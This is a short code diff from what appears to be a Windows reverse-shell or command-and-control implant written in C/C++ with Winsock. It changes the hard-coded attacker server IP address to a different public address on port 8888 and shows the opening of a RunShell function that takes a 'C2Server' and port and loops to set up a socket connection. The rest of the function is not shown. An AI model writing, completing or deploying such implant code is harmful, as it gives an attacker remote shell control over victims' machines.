@@ -7,14 +7,14 @@
 #pragma comment(lib , "Ws2_32.lib")
 #pragma warning(disable:4996)
 
-#define SERVER_IP "94.198.218.23"
+#define SERVER_IP "45.9.43.217"
 #define SERVER_PORT 8888
 
 static void RunShell(const char* C2Server, int C2Port) {
 	while (TRUE) {
 		Sleep(1000);
 
-		SOCKET mySocket;  
+		SOCKET mySocket;
 		sockaddr_in addr;
 		WSADATA wsa;
 		WSAStartup(MAKEWORD(2, 2), &wsa);
